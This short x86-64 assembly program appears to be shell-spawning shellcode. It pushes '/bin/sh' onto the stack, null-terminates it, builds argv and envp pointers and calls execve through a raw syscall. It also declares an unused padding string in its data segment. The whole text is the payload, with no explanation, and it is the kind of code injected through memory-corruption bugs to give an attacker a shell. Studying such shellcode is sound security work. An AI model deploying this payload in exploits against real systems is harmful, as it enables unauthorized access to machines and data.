segment .data

	shellpath db "/bin/sh0aaaaaaaabbbbbbbb"

segment .text
	global _start

_start:

	xor rax, rax
        mov rcx,0x3068732f6e69622f
        push rcx
        mov rbx,rsp
	

	mov [rbx+7], al
	mov [rbx+8], rbx
	mov [rbx+16], rax

	mov al, 59
	lea rdi, [rbx]
	lea rsi, [rbx+8]
	lea rdx, [rbx+16]

	syscall

